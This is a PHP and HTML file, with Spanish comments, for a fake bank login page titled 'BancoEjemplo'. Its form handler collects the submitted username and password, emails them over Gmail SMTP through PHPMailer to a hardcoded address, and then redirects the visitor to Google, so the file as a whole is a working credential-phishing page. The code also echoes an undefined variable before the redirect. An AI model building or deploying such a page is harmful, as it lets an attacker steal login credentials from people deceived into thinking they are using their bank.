<?php
date_default_timezone_set('America/Mexico_City'); // Reemplaza con tu zona horaria
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require '\Usuario\Documentos\laragon-6.0.0\laragon-6.0.0\www\backdoor\PHPMailer-master\src\Exception.php';
require '\Usuario\Documentos\laragon-6.0.0\laragon-6.0.0\www\backdoor\PHPMailer-master\src\PHPMailer.php';
require '\Usuario\Documentos\laragon-6.0.0\laragon-6.0.0\www\backdoor\PHPMailer-master\src\SMTP.php';

function enviarCorreo($usuario, $contrasena) {
  // Crear el mensaje del correo electrónico
  $mensaje = "**Usuario:** $usuario\n**Contraseña:** $contrasena";

  // Configurar el servidor SMTP (reemplaza los valores por los tuyos)
  $smtpHost = "smtp.gmail.com";
  $smtpPort = 587;
  $smtpUsername = "tu_correo@gmail.com";
  $smtpPassword = "tu_contrasena";

  // Crear el objeto PHPMailer
  $mail = new PHPMailer();

  // Configurar el SMTP
  $mail->isSMTP();
  $mail->Host = $smtpHost;
  $mail->Port = $smtpPort;
  $mail->SMTPAuth = true;
  $mail->Username = $smtpUsername;
  $mail->Password = $smtpPassword;
  $mail->SMTPSecure = "tls";

  // Configurar el correo electrónico
  $mail->setFrom($smtpUsername, "BancoEjemplo");
  $mail->addAddress("steven.montoya19@unach.mx");
  $mail->Subject = "Acceso a cuenta - BancoEjemplo";
  $mail->Body = $mensaje;

  // Enviar el correo electrónico
  if (!$mail->send()) {
    echo "Error al enviar el correo electrónico: " . $mail->ErrorInfo;
  } else {
    echo "Correo electrónico enviado correctamente.";
  }
}

// Verificar si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Obtener los datos del formulario
  $usuario = $_POST['usuario'];
  $contrasena = $_POST['contrasena'];

  // Enviar el correo electrónico
  enviarCorreo($usuario, $contrasena);
  echo "Error al enviar el correo electrónico: " . $mail->ErrorInfo;

  // Redirigir al usuario a Google
  header("Location: https://www.google.com");
  exit();
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sitio web falso - BancoEjemplo</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <header>
    <img src="logo-bancoejemplo.png" alt="Banco Ejemplo">
  </header>
  <main>
    <h1>Acceso a tu cuenta</h1>
    <p>Por favor, ingresa tus datos para acceder a tu cuenta.</p>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
      <label for="usuario">Usuario:</label>
      <input type="text" id="usuario" name="usuario" placeholder="Ingresa tu nombre de usuario">
      <br>
      <label for="contrasena">Contraseña:</label>
      <input type="password" id="contrasena" name="contrasena" placeholder="Ingresa tu contraseña">
      <br>
      <button type="submit">Iniciar sesión</button>
    </form>
    <p><a href="#">¿Olvidaste tu contraseña?</a></p>
  </main>
  <footer>
    <p>Copyright &copy; 2023 Banco Ejemplo</p>
  </footer>
</body>
</html>
